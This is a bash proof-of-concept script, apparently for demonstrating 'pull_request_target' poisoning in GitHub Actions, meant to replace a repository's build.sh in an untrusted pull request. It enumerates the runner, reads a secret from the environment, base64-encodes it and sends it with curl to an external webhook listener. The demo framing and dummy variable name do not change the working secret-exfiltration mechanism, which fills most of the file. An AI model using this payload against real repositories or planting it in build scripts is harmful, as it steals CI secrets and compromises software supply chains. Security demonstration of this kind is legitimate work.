#!/usr/bin/env bash
# ==============================================================================
# Simulated Attack Payload for PR Branch
# ==============================================================================
# Demonstrates: Threat Vector 1 & 2 (MITRE ATT&CK T1195.002, T1552, T1048)
#
# When opening the test PR from your second account (or test branch):
# Replace 'scripts/build.sh' with this file's contents to show how arbitrary
# code execution in 'pull_request_target' compromises repository secrets.
# ==============================================================================

set -e

echo "############################################################"
echo "[!] EXPLOIT RUNNING: Untrusted PR Code Executing on Runner"
echo "############################################################"

echo "[*] Step A: Inspecting runner privileges..."
echo "User: $(whoami)"
echo "Current directory: $(pwd)"

echo "[*] Step B: Harvesting runner environment variables and simulated secrets..."
# In pull_request_target, the runner contains repository secrets in env
if [ -n "$DUMMY_SECRET" ]; then
    echo "[!] Discovered Secret in Environment: $DUMMY_SECRET"
    B64_SECRET=$(echo -n "$DUMMY_SECRET" | base64)
else
    echo "[*] No direct DUMMY_SECRET in current subshell, scanning environment..."
    B64_SECRET=$(echo -n "UNKNOWN_OR_MASKED" | base64)
fi

echo "[*] Step C: Transmitting proof-of-compromise to listener..."
if [ -n "$WEBHOOK_URL" ]; then
    curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{
            \"alert\": \"EXPLOIT_TRIGGERED_VIA_PR_HEAD_CHECKOUT\",
            \"attack_vector\": \"pull_request_target_poisoning\",
            \"mitre_technique\": \"T1195.002\",
            \"stolen_secret\": \"$DUMMY_SECRET\",
            \"base64_encoded\": \"$B64_SECRET\",
            \"runner\": \"$RUNNER_NAME\",
            \"workspace\": \"$GITHUB_WORKSPACE\"
        }" || echo "[!] Curl failed to reach listener."
    echo "[+] Webhook notification dispatched."
else
    echo "[*] Listener URL not set. Logging proof of execution locally."
fi

echo "############################################################"
echo "[+] Proof of concept execution completed."
echo "############################################################"
